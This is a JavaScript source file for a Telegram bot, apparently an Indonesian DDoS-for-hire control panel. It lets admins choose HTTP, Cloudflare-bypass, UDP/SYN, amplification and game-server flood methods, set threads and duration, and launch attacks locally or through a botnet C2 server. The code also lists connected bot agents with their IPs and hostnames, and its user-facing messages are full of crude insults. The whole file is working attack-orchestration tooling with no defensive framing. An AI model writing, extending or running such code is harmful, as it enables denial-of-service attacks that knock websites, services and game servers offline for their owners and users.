import { Telegraf, Markup } from 'telegraf';
import { message } from 'telegraf/filters';
import axios from 'axios';
import { logger } from '../utils/logger.js';
import { methodExecutor } from '../c2/method-executor.js';
import crypto from 'crypto';
import { REQUESTS_SENT, BYTES_SENT } from '../utils/counter.js';

export class TelegramBotInline {
    constructor(token, adminIds, config) {
        this.bot = new Telegraf(token);
        this.adminIds = Array.isArray(adminIds) ? adminIds : [adminIds];
        this.config = config;
        this.userSessions = new Map(); // Store user input sessions
        this.setupHandlers();
    }

    isAdmin(userId) {
        return this.adminIds.includes(userId.toString());
    }

    // Main menu keyboard
    mainMenu() {
        return Markup.keyboard([
            ['⚡ Attack Biasa', '🔥 C2 Attack'],
            ['🎯 Combo Attack', '📊 Status'],
            ['🤖 Lihat Bots', '📋 Methods'],
            ['⚙️ Settings', '❌ Stop All']
        ]).resize();
    }

    // Layer selection
    layerMenu() {
        return Markup.inlineKeyboard([
            [
                Markup.button.callback('🌐 Layer 7 (HTTP)', 'layer_7'),
                Markup.button.callback('🔌 Layer 4 (TCP/UDP)', 'layer_4')
            ],
            [Markup.button.callback('« Kembali', 'back_main')]
        ]);
    }

    // Layer 7 methods (split into pages)
    layer7MethodsPage1() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔥 SIMPLE-ULTIMATE', 'method_SIMPLE-ULTIMATE'), Markup.button.callback('💀 BRUTAL-ULTIMATE', 'method_BRUTAL-ULTIMATE')],
            [Markup.button.callback('GET', 'method_GET'), Markup.button.callback('POST', 'method_POST')],
            [Markup.button.callback('HTTP2', 'method_HTTP2'), Markup.button.callback('HTTP3', 'method_HTTP3')],
            [Markup.button.callback('CFB', 'method_CFB'), Markup.button.callback('BYPASS', 'method_BYPASS')],
            [Markup.button.callback('HTTP2-CF', 'method_HTTP2-CF'), Markup.button.callback('ULTIMATE', 'method_ULTIMATE')],
            [Markup.button.callback('➡️ More Methods', 'layer7_page2'), Markup.button.callback('« Back', 'back_layer')]
        ]);
    }

    layer7MethodsPage2() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔓 MANUAL-BYPASS', 'method_MANUAL-BYPASS'), Markup.button.callback('🚀 ADVANCED-MANUAL', 'method_ADVANCED-MANUAL')],
            [Markup.button.callback('CAPTCHA-SOLVER', 'method_CAPTCHA-SOLVER'), Markup.button.callback('HYBRID-CF', 'method_HYBRID-CF')],
            [Markup.button.callback('SLOW', 'method_SLOW'), Markup.button.callback('STRESS', 'method_STRESS')],
            [Markup.button.callback('DYN', 'method_DYN'), Markup.button.callback('COOKIE', 'method_COOKIE')],
            [Markup.button.callback('XMLRPC', 'method_XMLRPC'), Markup.button.callback('APACHE', 'method_APACHE')],
            [Markup.button.callback('NULL', 'method_NULL'), Markup.button.callback('CF-KILLER', 'method_CF-KILLER')],
            [Markup.button.callback('BOT', 'method_BOT'), Markup.button.callback('HEAD', 'method_HEAD')],
            [Markup.button.callback('⬅️ Prev', 'layer7_page1'), Markup.button.callback('« Back', 'back_layer')]
        ]);
    }

    // Layer 4 methods
    layer4Methods() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('UDP', 'method_UDP'), Markup.button.callback('TCP', 'method_TCP')],
            [Markup.button.callback('SYN', 'method_SYN'), Markup.button.callback('CONNECTION', 'method_CONNECTION')],
            [Markup.button.callback('MINECRAFT', 'method_MINECRAFT'), Markup.button.callback('MCBOT', 'method_MCBOT')],
            [Markup.button.callback('VSE', 'method_VSE'), Markup.button.callback('TS3', 'method_TS3')],
            [Markup.button.callback('FIVEM', 'method_FIVEM'), Markup.button.callback('MCPE', 'method_MCPE')],
            [Markup.button.callback('DNS-AMP', 'method_DNS-AMP'), Markup.button.callback('NTP-AMP', 'method_NTP-AMP')],
            [Markup.button.callback('« Back', 'back_layer')]
        ]);
    }

    // Quick presets
    quickPresets() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔥 CF Bypass', 'preset_cf')],
            [Markup.button.callback('⚡ HTTP Flood', 'preset_http')],
            [Markup.button.callback('💣 UDP Flood', 'preset_udp')],
            [Markup.button.callback('🎮 Game Server', 'preset_game')],
            [Markup.button.callback('🚀 Ultimate', 'preset_ultimate')],
            [Markup.button.callback('« Kembali', 'back_main')]
        ]);
    }

    setupHandlers() {
        // Start command
        this.bot.start((ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ NGAPAIN KONTOL? LU BUKAN ADMIN ANJING!');
            }

            ctx.reply(
                `╔═══════════════════════════════╗\n` +
                `║   🔥 *ARYZZ DDOS BOT* 🔥   ║\n` +
                `╚═══════════════════════════════╝\n\n` +
                `Eh *${ctx.from.first_name}* udah dateng nih!\n` +
                `Bot DDoS paling gacor se-Indonesia 🔥\n\n` +
                `⚡ *Status:* Siap hajar target lu\n` +
                `🤖 *Versi:* 4.0 Premium Edition\n` +
                `🎯 *Methods:* 36+ cara buat down in target\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `💡 *Pencet menu dibawah buat mulai ngancurin!*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        });

        // Main menu buttons
        this.bot.hears('⚡ Attack Biasa', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            const session = { type: 'single', step: 'target' };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.reply(
                '🎯 *ATTACK BIASA*\n\n' +
                'Kirim target yang mau lu hajar:\n\n' +
                'Contoh:\n' +
                '• https://target.com\n' +
                '• 1.2.3.4:80\n' +
                '• mc.server.com:25565\n\n' +
                'Cepetan kirim kontol!',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.hears('🔥 C2 Attack', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            const session = { type: 'c2', step: 'target' };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.reply(
                '🔥🔥🔥 *C2 ATTACK GACOR* 🔥🔥🔥\n\n' +
                'Ini attack paling brutal cok!\n' +
                'Bakal pake semua power bot gw\n\n' +
                'Kirim target yang mau lu banting:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.hears('🎯 Combo Attack', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            ctx.reply(
                '🎯 *COMBO ATTACK BRUTAL*\n\n' +
                'Mau pake preset atau custom sendiri?\n' +
                'Combo attack = hajar pake banyak method sekaligus!',
                this.quickPresets()
            );
        });

        this.bot.hears('📊 Status', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            await this.showC2Status(ctx);
        });

        this.bot.hears('🤖 Lihat Bots', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            await this.showBots(ctx);
        });

        this.bot.hears('📋 Methods', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            ctx.reply(
                '📋 *PILIH LAYER ATTACK*\n\n' +
                'Layer 7: Buat hajar website (HTTP/HTTPS)\n' +
                'Layer 4: Buat hajar server/game (TCP/UDP)\n\n' +
                'Pilih yang mana kontol?',
                { parse_mode: 'Markdown', ...this.layerMenu() }
            );
        });

        this.bot.hears('❌ Stop All', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            ctx.reply(
                '⚠️ *STOP SEMUA ATTACK?*\n\n' +
                'Serius mau stop? Padahal lagi asik nih hajar target\n' +
                'Lu yakin bangsat?',
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Iya stop aja', 'confirm_stop')],
                    [Markup.button.callback('❌ Kagak jadi', 'back_main')]
                ])
            );
        });

        // Callback query handlers
        this.bot.action('back_main', (ctx) => {
            ctx.editMessageText(
                'Menu utama:',
                this.mainMenu()
            );
        });

        this.bot.action('back_layer', (ctx) => {
            ctx.editMessageText(
                '📋 *PILIH LAYER ATTACK*\n\n' +
                'Layer 7: Buat hajar website\n' +
                'Layer 4: Buat hajar server/game\n\n' +
                'Mau yang mana?',
                { parse_mode: 'Markdown', ...this.layerMenu() }
            );
        });

        this.bot.action('layer_7', (ctx) => {
            ctx.editMessageText(
                '🌐 *LAYER 7 METHODS*\n\n' +
                'Pilih method buat hajar website:\n' +
                'Ada 20+ method brutal nih!',
                { parse_mode: 'Markdown', ...this.layer7MethodsPage1() }
            );
        });

        this.bot.action('layer7_page2', (ctx) => {
            ctx.editMessageText(
                '🌐 *LAYER 7 METHODS (Halaman 2)*\n\n' +
                'Masih banyak lagi method nya cok!',
                { parse_mode: 'Markdown', ...this.layer7MethodsPage2() }
            );
        });

        this.bot.action('layer7_page1', (ctx) => {
            ctx.editMessageText(
                '🌐 *LAYER 7 METHODS*\n\n' +
                'Pilih method yang mau dipake:',
                { parse_mode: 'Markdown', ...this.layer7MethodsPage1() }
            );
        });

        this.bot.action('layer_4', (ctx) => {
            ctx.editMessageText(
                '🔌 *LAYER 4 METHODS*\n\n' +
                'Method buat hajar server/game:\n' +
                'Cocok buat down in server Minecraft, FiveM, dll',
                { parse_mode: 'Markdown', ...this.layer4Methods() }
            );
        });

        // Method selection
        this.bot.action(/^method_(.+)$/, (ctx) => {
            const method = ctx.match[1];
            const session = this.userSessions.get(ctx.from.id);
            
            if (session) {
                session.method = method;
                session.step = 'threads';
                this.userSessions.set(ctx.from.id, session);
                
                ctx.editMessageText(
                    `✅ Method: *${method}*\n\n` +
                    `Berapa threads yang mau lu pake?\n` +
                    `Makin banyak makin kenceng hajarnya!\n\n` +
                    `Rekomendasi:\n` +
                    `• Ringan: 100-500\n` +
                    `• Sedang: 500-2000\n` +
                    `• Brutal: 2000-10000\n\n` +
                    `Kirim angka nya kontol:`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                ctx.answerCbQuery('Mulai dari menu utama dulu anjing!');
            }
        });

        // Preset handlers
        this.bot.action('preset_cf', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'cf',
                method: 'HTTP2-CF,CFB,BYPASS',
                threads: 5000,
                duration: 300,
                rpc: 10
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '🔥 *CLOUDFLARE BYPASS PRESET*\n\n' +
                'Preset khusus buat tembus Cloudflare!\n\n' +
                'Methods: HTTP2-CF, CFB, BYPASS\n' +
                'Threads: 5000\n' +
                'Durasi: 300 detik\n\n' +
                'Kirim target yang mau lu hajar:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_http', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'http',
                method: 'GET,POST,HTTP2,HTTP3',
                threads: 5000,
                duration: 300,
                rpc: 10
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '⚡ *HTTP FLOOD PRESET*\n\n' +
                'Banjir request HTTP ke target!\n\n' +
                'Methods: GET, POST, HTTP2, HTTP3\n' +
                'Threads: 5000\n' +
                'Durasi: 300 detik\n\n' +
                'Kirim target yang mau lu banting:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_udp', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'udp',
                method: 'UDP',
                threads: 10000,
                duration: 300,
                rpc: 1
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '💣 *UDP FLOOD PRESET*\n\n' +
                'Banjir UDP paling brutal!\n\n' +
                'Method: UDP\n' +
                'Threads: 10000\n' +
                'Durasi: 300 detik\n\n' +
                'Kirim target (IP:PORT) nya kontol:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_game', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'game',
                method: 'MINECRAFT,VSE,TS3',
                threads: 5000,
                duration: 300,
                rpc: 1
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '🎮 *GAME SERVER PRESET*\n\n' +
                'Khusus buat down in server game!\n\n' +
                'Methods: MINECRAFT, VSE, TS3\n' +
                'Threads: 5000\n' +
                'Durasi: 300 detik\n\n' +
                'Kirim IP:PORT server yang mau lu hajar:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_ultimate', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'ultimate',
                method: 'GET,POST,HTTP2,HTTP3,CFB,BYPASS,ULTIMATE',
                threads: 10000,
                duration: 300,
                rpc: 10
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '🚀 *ULTIMATE PRESET*\n\n' +
                'Preset paling gila! Pake semua method!\n\n' +
                'Methods: GET, POST, HTTP2, HTTP3, CFB, BYPASS, ULTIMATE\n' +
                'Threads: 10000\n' +
                'Durasi: 300 detik\n\n' +
                'Kirim target yang mau lu ancurin total:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('confirm_stop', async (ctx) => {
            // TODO: Implement stop all attacks
            ctx.editMessageText(
                '✅ *ATTACK UDAH DISTOP SEMUA!*\n\n' +
                'Oke gw udah stop semua attack yang lagi jalan.\n' +
                'Target nya selamat... untuk sekarang 😈',
                { parse_mode: 'Markdown' }
            );
        });

        // Text message handler (for user input)
        this.bot.on('text', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            const session = this.userSessions.get(ctx.from.id);
            if (!session) return;

            const text = ctx.message.text;

            // Handle based on current step
            if (session.step === 'target') {
                session.target = text;
                
                if (session.preset) {
                    // Preset selected, launch directly
                    await this.launchC2Attack(ctx, session);
                    this.userSessions.delete(ctx.from.id);
                } else {
                    // Ask for method
                    session.step = 'method';
                    this.userSessions.set(ctx.from.id, session);
                    
                    ctx.reply(
                        `✅ Target: \`${text}\`\n\n` +
                        `Pilih method:`,
                        { parse_mode: 'Markdown', ...this.layerMenu() }
                    );
                }
            } else if (session.step === 'threads') {
                const threads = parseInt(text);
                if (isNaN(threads) || threads < 1) {
                    return ctx.reply('❌ Threads harus angka kontol! Jangan asal kirim!');
                }
                
                session.threads = threads;
                session.step = 'duration';
                this.userSessions.set(ctx.from.id, session);
                
                ctx.reply(
                    `✅ Threads: *${threads}*\n\n` +
                    `Berapa lama mau hajar target? (detik)\n` +
                    `Makin lama makin sakit!\n\n` +
                    `Rekomendasi:\n` +
                    `• Cepet: 60-120 detik\n` +
                    `• Sedang: 120-300 detik\n` +
                    `• Lama: 300-600 detik\n\n` +
                    `Kirim angka durasi nya:`,
                    { parse_mode: 'Markdown' }
                );
            } else if (session.step === 'duration') {
                const duration = parseInt(text);
                if (isNaN(duration) || duration < 1) {
                    return ctx.reply('❌ Duration harus angka bangsat! Jangan asal!');
                }
                
                session.duration = duration;
                session.rpc = 10; // Default RPC
                
                // Launch attack
                if (session.type === 'c2') {
                    await this.launchC2Attack(ctx, session);
                } else {
                    await this.launchSingleAttack(ctx, session);
                }
                
                this.userSessions.delete(ctx.from.id);
            }
        });
    }

    async launchC2Attack(ctx, session) {
        const { target, method, threads, duration, rpc } = session;
        
        ctx.reply(
            `🔥🔥🔥 *SIAP-SIAP HAJAR!* 🔥🔥🔥\n\n` +
            `🎯 Target: \`${target}\`\n` +
            `⚡ Method: *${method}*\n` +
            `🧵 Threads: *${threads}*\n` +
            `⏱ Durasi: *${duration} detik*\n` +
            `🔄 RPC: *${rpc}*\n\n` +
            `💣 LAGI NYIAPIN ATTACK... 💣`,
            { parse_mode: 'Markdown' }
        );

        // Try C2 server first, if fails execute locally
        const c2Url = this.config.c2?.url || 'http://localhost:8080';
        const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';
        const useLocalExecution = this.config.c2?.useLocalExecution !== false; // Default true

        try {
            // Try C2 server if configured
            if (!useLocalExecution) {
                const https = await import('https');
                const response = await axios.post(
                    `${c2Url}/api/attack/start`,
                    { target, method, threads, duration, rpc },
                    {
                        headers: {
                            'X-API-Key': apiKey,
                            'Content-Type': 'application/json'
                        },
                        timeout: 5000,
                        httpsAgent: new https.Agent({
                            rejectUnauthorized: false
                        })
                    }
                );

                if (response.data.success) {
                    ctx.reply(
                        `✅ *ATTACK UDAH JALAN VIA C2!* ✅\n\n` +
                        `🆔 Attack ID: \`${response.data.attack.id}\`\n` +
                        `🔥 SEMUA BOT GW LAGI HAJAR TARGET LU! 🔥\n\n` +
                        `Target nya bakal nangis nih 😂`,
                        { parse_mode: 'Markdown', ...this.mainMenu() }
                    );
                    return;
                }
            }
        } catch (error) {
            logger.warning(`C2 server not available, executing locally: ${error.message}`);
        }

        // Execute locally using method executor
        try {
            const attackId = crypto.randomUUID();
            const methods = method.split(',').map(m => m.trim());
            
            logger.info(`🔥 Executing attack locally: ${target} (${method})`);
            logger.info(`   Threads: ${threads}, Duration: ${duration}s, RPC: ${rpc}`);
            
            // Track stats before attack
            const startRequests = REQUESTS_SENT.get();
            const startBytes = BYTES_SENT.get();
            const startTime = Date.now();
            
            // Load user agents and referers
            const userAgents = [];
            const referers = [];
            
            if (methods.length > 1) {
                // Multiple methods - combo attack
                methodExecutor.executeCombo({
                    attackId,
                    target,
                    methods,
                    threads,
                    duration,
                    rpc,
                    userAgents,
                    referers,
                    proxies: null,
                    onProgress: (data) => {
                        logger.debug(`Attack progress: ${data.elapsed}s elapsed`);
                    },
                    onComplete: (data) => {
                        // Calculate actual stats from counter difference
                        const endRequests = REQUESTS_SENT.get();
                        const endBytes = BYTES_SENT.get();
                        const endTime = Date.now();
                        
                        const totalRequests = endRequests - startRequests;
                        const totalBytes = endBytes - startBytes;
                        const actualDuration = Math.floor((endTime - startTime) / 1000);
                        const avgSpeed = actualDuration > 0 ? Math.floor(totalRequests / actualDuration) : 0;
                        
                        ctx.reply(
                            `✅ *COMBO ATTACK KELAR BANGSAT!* ✅\n\n` +
                            `🎯 Target: \`${target}\`\n` +
                            `⚡ Methods: ${methods.join(', ')}\n` +
                            `⏱ Durasi: ${actualDuration} detik\n\n` +
                            `📊 *STATISTIK REAL:*\n` +
                            `├─ Total Request: *${totalRequests.toLocaleString()}* 🚀\n` +
                            `├─ Total Bytes: *${(totalBytes / 1024 / 1024).toFixed(2)} MB*\n` +
                            `├─ Avg Speed: *${avgSpeed} req/s*\n` +
                            `└─ Methods Sukses: ${data.results?.filter(r => r.success).length || methods.length}/${methods.length}\n\n` +
                            `Target nya udah babak belur cok! 😈`,
                            { parse_mode: 'Markdown', ...this.mainMenu() }
                        );
                    }
                }).catch(err => {
                    logger.error(`Combo attack error: ${err.message}`);
                });
            } else {
                // Single method
                methodExecutor.executeMethod({
                    attackId,
                    target,
                    method: methods[0],
                    threads,
                    duration,
                    rpc,
                    userAgents,
                    referers,
                    proxies: null,
                    onProgress: (data) => {
                        logger.debug(`Attack progress: ${data.elapsed}s elapsed`);
                    },
                    onComplete: (data) => {
                        // Calculate actual stats from counter difference
                        const endRequests = REQUESTS_SENT.get();
                        const endBytes = BYTES_SENT.get();
                        const endTime = Date.now();
                        
                        const totalRequests = endRequests - startRequests;
                        const totalBytes = endBytes - startBytes;
                        const actualDuration = Math.floor((endTime - startTime) / 1000);
                        const avgSpeed = actualDuration > 0 ? Math.floor(totalRequests / actualDuration) : 0;
                        
                        ctx.reply(
                            `✅ *ATTACK SELESAI KONTOL!* ✅\n\n` +
                            `🎯 Target: \`${target}\`\n` +
                            `⚡ Method: ${methods[0]}\n` +
                            `⏱ Durasi: ${actualDuration} detik\n\n` +
                            `📊 *STATISTIK REAL:*\n` +
                            `├─ Total Request: *${totalRequests.toLocaleString()}* 🚀\n` +
                            `├─ Total Bytes: *${(totalBytes / 1024 / 1024).toFixed(2)} MB*\n` +
                            `└─ Avg Speed: *${avgSpeed} req/s*\n\n` +
                            `Target nya udah babak belur cok! 😈`,
                            { parse_mode: 'Markdown', ...this.mainMenu() }
                        );
                    },
                    onError: (data) => {
                        ctx.reply(
                            `❌ *ATTACK ERROR ANJING!* ❌\n\n` +
                            `Ada yang salah nih: ${data.error}\n\n` +
                            `Coba lagi kontol!`,
                            { parse_mode: 'Markdown', ...this.mainMenu() }
                        );
                    }
                }).catch(err => {
                    logger.error(`Attack error: ${err.message}`);
                });
            }

            ctx.reply(
                `✅ *ATTACK UDAH JALAN BANGSAT!* ✅\n\n` +
                `🆔 Attack ID: \`${attackId}\`\n` +
                `🔥 BOT GW LAGI HAJAR TARGET LU! 🔥\n\n` +
                `⏰ Bakal kelar dalam ${duration} detik\n` +
                `Tunggu aja target nya down 😈`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );

        } catch (error) {
            logger.error(`Failed to execute attack: ${error.message}`);
            ctx.reply(
                `❌ *ERROR KONTOL!* ❌\n\n` +
                `Ada yang error nih: ${error.message}\n\n` +
                `Coba lagi atau ganti method!`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        }
    }

    async launchSingleAttack(ctx, session) {
        ctx.reply(
            `🔥 *ATTACK BIASA BELUM JALAN!* 🔥\n\n` +
            `Fitur ini masih dalam pengembangan kontol!\n` +
            `Pake C2 Attack aja, lebih gacor!`,
            { parse_mode: 'Markdown', ...this.mainMenu() }
        );
    }

    async showC2Status(ctx) {
        const useLocalExecution = this.config.c2?.useLocalExecution !== false;
        
        // If using local execution, show local stats
        if (useLocalExecution) {
            const activeAttacks = methodExecutor.getActiveAttacks();
            const totalRequests = REQUESTS_SENT.get();
            const totalBytes = BYTES_SENT.get();
            
            ctx.reply(
                `╔═══════════════════════════════╗\n` +
                `║   📊 *STATUS BOT LOKAL* 📊   ║\n` +
                `╚═══════════════════════════════╝\n\n` +
                `⚡ *STATUS ATTACK*\n` +
                `├─ Lagi Jalan: *${activeAttacks.length}* 🔥\n` +
                `└─ Mode: *Local Execution*\n\n` +
                `📈 *PERFORMA REAL-TIME*\n` +
                `├─ Total Request: *${totalRequests.toLocaleString()}* 🚀\n` +
                `├─ Total Bytes: *${(totalBytes / 1024 / 1024).toFixed(2)} MB*\n` +
                `└─ Avg Speed: *${totalRequests > 0 ? Math.floor(totalRequests / 60) : 0} req/s*\n\n` +
                `💡 *Active Attacks:*\n` +
                (activeAttacks.length > 0 
                    ? activeAttacks.slice(0, 3).map(a => 
                        `• ${a.method} → ${a.target.substring(0, 30)}...`
                    ).join('\n')
                    : '• Tidak ada attack yang jalan\n') +
                `\n\n────────────────────────\n` +
                `⏰ Update: ${new Date().toLocaleTimeString('id-ID')}\n` +
                `🔥 *BOT LAGI NGANCURIN TARGET!* 🔥`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
            return;
        }
        
        // Otherwise try C2 server
        const c2Url = this.config.c2?.url || 'http://localhost:8080';
        const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

        try {
            const https = await import('https');
            const response = await axios.get(`${c2Url}/api/stats/overview`, {
                headers: { 'X-API-Key': apiKey },
                timeout: 5000,
                httpsAgent: new https.Agent({
                    rejectUnauthorized: false
                })
            });

            const stats = response.data.stats || {};
            const bots = stats.bots || { total: 0, online: 0, offline: 0 };
            const attacks = stats.attacks || { running: 0, completed: 0, total: 0 };
            const totalRequests = stats.totalRequests || 0;
            const successRate = stats.successRate || 0;

            ctx.reply(
                `╔═══════════════════════════════\n` +
                `║   📊 *STATUS BOT GW* 📊   ║\n` +
                `╚═══════════════════════════════\n\n` +
                `🤖 *BOT AGENTS*\n` +
                `├─ Total: *${bots.total}* bot\n` +
                `├─ Online: *${bots.online}* 🟢\n` +
                `└─ Offline: *${bots.offline}* 🔴\n\n` +
                `⚡ *STATUS ATTACK*\n` +
                `├─ Lagi Jalan: *${attacks.running}* 🔥\n` +
                `├─ Udah Kelar: *${attacks.completed}* ✅\n` +
                `└─ Total: *${attacks.total}*\n\n` +
                `📈 *PERFORMA*\n` +
                `├─ Total Request: *${totalRequests.toLocaleString()}*\n` +
                `└─ Success Rate: *${successRate}%* 🎯\n\n` +
                `────────────────────────\n` +
                `⏰ Update terakhir: ${new Date().toLocaleTimeString('id-ID')}`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        } catch (error) {
            ctx.reply(
                `❌ *C2 SERVER MATI KONTOL!*\n\n` +
                `Error: ${error.message}\n\n` +
                `Coba pake mode lokal aja!`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        }
    }

    async showBots(ctx) {
        const c2Url = this.config.c2?.url || 'http://localhost:8080';
        const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

        try {
            const https = await import('https');
            const response = await axios.get(`${c2Url}/api/bots`, {
                headers: { 'X-API-Key': apiKey },
                timeout: 5000,
                httpsAgent: new https.Agent({
                    rejectUnauthorized: false
                })
            });

            const bots = response.data.bots;
            
            if (bots.length === 0) {
                return ctx.reply(
                    `╔═══════════════════════════════\n` +
                    `║   🤖 *BOT AGENTS* 🤖   ║\n` +
                    `╚═══════════════════════════════\n\n` +
                    `⚠️ Belum ada bot yang connect kontol!\n\n` +
                    `💡 Cara connect bot:\n` +
                    `\`node index.js c2-agent --c2-url YOUR_URL\`\n\n` +
                    `Atau pake mode lokal aja, lebih simple!`,
                    { parse_mode: 'Markdown', ...this.mainMenu() }
                );
            }

            let msg = `╔═══════════════════════════════╗\n`;
            msg += `║   🤖 *CONNECTED BOTS* 🤖   ║\n`;
            msg += `╚═══════════════════════════════╝\n\n`;
            msg += `📊 Total: *${bots.length}* bot(s) online\n\n`;

            bots.slice(0, 10).forEach((bot, index) => {
                const status = bot.status === 'online' ? '🟢' : '🔴';
                msg += `${status} *Bot ${index + 1}*\n`;
                msg += `├─ Host: \`${bot.hostname}\`\n`;
                msg += `├─ IP: \`${bot.ip}\`\n`;
                msg += `└─ OS: ${bot.os}\n\n`;
            });

            if (bots.length > 10) {
                msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                msg += `... dan ${bots.length - 10} bot lainnya\n\n`;
            }

            msg += `💪 *BOTNET SIAP HAJAR TARGET!*`;

            ctx.reply(msg, { parse_mode: 'Markdown', ...this.mainMenu() });
        } catch (error) {
            ctx.reply(
                `❌ *GAK BISA CONNECT KE C2!*\n\n` +
                `Error: ${error.message}\n\n` +
                `Server C2 nya lagi mati kali!`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        }
    }

    launch() {
        this.bot.launch();
        logger.success('🔥 TELEGRAM BOT INLINE VERSION UDAH JALAN! 🔥');
        logger.info(`👤 Admin IDs: ${this.adminIds.join(', ')}`);
        
        process.once('SIGINT', () => this.bot.stop('SIGINT'));
        process.once('SIGTERM', () => this.bot.stop('SIGTERM'));
    }
}
